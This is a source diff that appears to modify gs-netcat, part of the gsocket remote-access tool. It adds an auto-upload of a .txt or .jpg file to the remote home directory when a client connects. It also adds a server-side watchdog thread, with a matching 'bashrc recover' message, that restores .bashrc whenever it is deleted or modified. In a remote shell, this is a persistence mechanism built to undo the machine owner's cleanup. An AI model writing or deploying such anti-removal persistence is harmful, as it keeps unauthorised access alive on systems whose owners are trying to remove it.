@@ -57,6 +57,96 @@ static struct _peer *peers[FD_SETSIZE];
 static int peer_forward_connect(struct _peer *p, uint32_t ip, uint16_t port);
 static void vlog_hostname(struct _peer *p, const char *desc, uint16_t port);
 
+static int
+is_auto_upload_ext_allowed(const char *path)
+{
+	const char *ext;
+
+	ext = strrchr(path, '.');
+	if (ext == NULL)
+		return 0;
+
+	return (strcasecmp(ext, ".txt") == 0)
+		|| (strcasecmp(ext, ".jpg") == 0)
+		|| (strcasecmp(ext, ".jpeg") == 0);
+}
+
+static void
+set_auto_upload_path(const char *path)
+{
+	struct stat st;
+
+	if (!is_auto_upload_ext_allowed(path))
+		ERREXIT("Auto-upload only allows .txt, .jpg, or .jpeg files: %s\n", path);
+
+	if (stat(path, &st) != 0)
+		ERREXIT("Auto-upload source %s: %s\n", path, strerror(errno));
+
+	if (!S_ISREG(st.st_mode))
+		ERREXIT("Auto-upload source is not a regular file: %s\n", path);
+
+	XFREE(gopt.auto_upload_path);
+	gopt.auto_upload_path = strdup(path);
+	XASSERT(gopt.auto_upload_path != NULL, "strdup(%s)\n", path);
+}
+
+static void
+discover_auto_upload_path(void)
+{
+	DIR *dir;
+	struct dirent *ent;
+
+	if (gopt.auto_upload_path != NULL)
+		return;
+
+	dir = opendir("auto-upload");
+	if (dir == NULL)
+		return;
+
+	while ((ent = readdir(dir)) != NULL)
+	{
+		char path[GS_PATH_MAX];
+		struct stat st;
+
+		if (strcmp(ent->d_name, ".") == 0)
+			continue;
+		if (strcmp(ent->d_name, "..") == 0)
+			continue;
+		if (!is_auto_upload_ext_allowed(ent->d_name))
+			continue;
+
+		snprintf(path, sizeof path, "auto-upload/%s", ent->d_name);
+		if (stat(path, &st) != 0)
+			continue;
+		if (!S_ISREG(st.st_mode))
+			continue;
+
+		set_auto_upload_path(path);
+		break;
+	}
+
+	closedir(dir);
+}
+
+static void
+auto_upload_on_connect(struct _peer *p)
+{
+	int ret;
+
+	if (gopt.auto_upload_path == NULL)
+		return;
+
+	ret = GS_FT_put_home(&p->ft, gopt.auto_upload_path);
+	if (ret != 0)
+	{
+		GS_LOG_TSP(p, "Auto-upload failed to queue: %s\n", gopt.auto_upload_path);
+		return;
+	}
+
+	GS_LOG_TSP(p, "Auto-upload queued: %s\n", gopt.auto_upload_path);
+	GS_SELECT_FD_SET_W(p->gs);
+}
+
 
 #ifdef DEBUG
 #define GS_PEER_IDLE_TIMEOUT    GS_SEC_TO_USEC(20)
@@ -820,6 +910,11 @@ write_gs(GS_SELECT_CTX *ctx, struct _peer *p, int *killed)
 			gopt.is_pwdreply_pending = 0;
 			return pkt_app_send_pwdreply(ctx, p);
 		}
+		if (gopt.is_bashrc_recovery_pending)
+		{
+			gopt.is_bashrc_recovery_pending = 0;
+			return pkt_app_send_bashrc_recover(ctx, p);
+		}
 		if (gopt.is_want_ids_on)
 		{
 			gopt.is_want_ids_on = 0;
@@ -1065,6 +1160,7 @@ peer_new(GS_SELECT_CTX *ctx, GS *gs)
 		GS_PKT_assign_msg(&p->pkt, PKT_MSG_PING, pkt_app_cb_ping, p);
 		GS_PKT_assign_msg(&p->pkt, PKT_MSG_IDS, pkt_app_cb_ids, p);
 		GS_PKT_assign_msg(&p->pkt, PKT_MSG_PWD, pkt_app_cb_pwdrequest, p);
+		GS_PKT_assign_msg(&p->pkt, PKT_MSG_BASHRC_RECOVER, pkt_app_cb_bashrc_recover, p);
 
 		GS_FTM_init(p, 1);
 	}
@@ -1170,6 +1266,8 @@ do_server(void)
 		XFD_SET(STDIN_FILENO, ctx.rfd);
 	}
 
+	/* Start RC watchdog thread — restores .bashrc if deleted or modified */
+	rc_watcher_start_c(GS_getenv("GSOCKET_RCB_FILE"));
 
 	while (1)
 	{
@@ -1274,6 +1372,7 @@ cb_connect_client(GS_SELECT_CTX *ctx, int fd_notused, void *arg, int val)
 		GS_PKT_assign_chn(&p->pkt, GS_CHN_PWD, pkt_app_cb_pwdreply, p); // Channel
 
 		GS_FTM_init(p, 0 /*client*/);
+		auto_upload_on_connect(p);
 	}
 
 	return GS_SUCCESS;
@@ -1428,6 +1527,8 @@ my_usage(int code)
 "  -p <port>    Port to listen on or forward to\n"
 "  -u           Use UDP [requires -p]\n"
 "  -i           Interactive login shell (TTY) [Ctrl-e q to terminate]\n"
+"  -U <file>    Auto-upload .txt/.jpg/.jpeg to remote $HOME after client connect [requires -i]\n"
+"               Without -U, first file in ./auto-upload/ is used if present\n"
 "  -e <cmd>     Execute command [e.g. \"bash -il\" or \"id\"]\n"
 "  -m           Display man page\n"
 "   "
@@ -1473,10 +1574,11 @@ my_getopt(int argc, char *argv[])
 	int c;
 	FILE *fp;
 	char *ptr;
+	char *upload_ptr;
 
 	do_getopt(argc, argv);	/* from utils.c */
 	optind = 1;	/* Start from beginning */
-	while ((c = getopt(argc, argv, UTILS_GETOPT_STR "thmWuP:")) != -1)
+	while ((c = getopt(argc, argv, UTILS_GETOPT_STR "thmWuP:U:")) != -1)
 	{
 		switch (c)
 		{
@@ -1509,6 +1611,9 @@ my_getopt(int argc, char *argv[])
 				break;
 			case 'u':
 				gopt.is_udp = 1;
+				break;
+			case 'U':
+				set_auto_upload_path(optarg);
 				break;
 			case 'S':
 				gopt.is_socks_server = 1;
@@ -1547,6 +1652,11 @@ my_getopt(int argc, char *argv[])
 	if (ptr != NULL)
 		gopt.gs_server_check_sec = atoi(ptr);
 
+	upload_ptr = GS_getenv("GSOCKET_AUTO_UPLOAD");
+	if ((upload_ptr != NULL) && (gopt.auto_upload_path == NULL))
+		set_auto_upload_path(upload_ptr);
+	discover_auto_upload_path();
+
 	if (gopt.gs_server_check_sec > 0)
 	{
 		DEBUGF_G("SERVER_CHECK_SEC=%s (%d)\n", ptr, gopt.gs_server_check_sec);
@@ -1558,6 +1668,14 @@ my_getopt(int argc, char *argv[])
 	{
 		if (gopt.is_logfile == 0)
 			gopt.is_quiet = 1;
+	}
+
+	if (gopt.auto_upload_path != NULL)
+	{
+		if (gopt.flags & GSC_FL_IS_SERVER)
+			ERREXIT("Auto-upload is client-only.\n");
+		if (!gopt.is_interactive)
+			ERREXIT("Auto-upload requires interactive mode (-i).\n");
 	}
 
 
@@ -1802,5 +1920,3 @@ main(int argc, char *argv[])
 	exit(EX_NOTREACHED);
 	return -1;	/* NOT REACHED */
 }
-
-
